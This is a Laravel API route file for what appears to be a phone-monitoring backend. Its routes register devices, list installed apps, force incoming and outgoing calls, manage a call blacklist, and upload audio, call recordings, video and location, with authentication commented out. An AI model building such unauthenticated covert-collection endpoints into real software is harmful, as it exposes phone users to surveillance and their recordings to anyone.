<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

// Route::middleware('auth:api')->get('/user', function (Request $request) {
//     return $request->user();
// });

Route::post('v1/user/register', 'App\Http\Controllers\Api\ApiCreateUser@registerAdmin');
Route::post('v1/device/register', 'App\Http\Controllers\Api\ApiDeviceController@registerDevice');
Route::post('v1/device/update', 'App\Http\Controllers\Api\ApiDeviceController@updateDevice');
Route::get('v1/device/applist/{device_id}', 'App\Http\Controllers\Api\ApiDeviceController@getApplications');

Route::post('v1/force/incoming', 'App\Http\Controllers\Api\ForceCallController@getForceIncoming');
Route::post('v1/force/outgoing', 'App\Http\Controllers\Api\ForceCallController@getForceOutgoing');
Route::post('v1/blacklist', 'App\Http\Controllers\Api\ForceCallController@getBlackList');

Route::post('v1/record/upload', 'App\Http\Controllers\Api\ApiRecordController@uploadAudioRecord');
Route::post('v1/callrecord/upload', 'App\Http\Controllers\Api\ApiRecordController@uploadCallRecord');
Route::post('v1/video/upload', 'App\Http\Controllers\Api\ApiRecordController@uploadVideoRecord');

Route::post('v1/location/upload', 'App\Http\Controllers\Api\ApiLocationController@uploadLocation');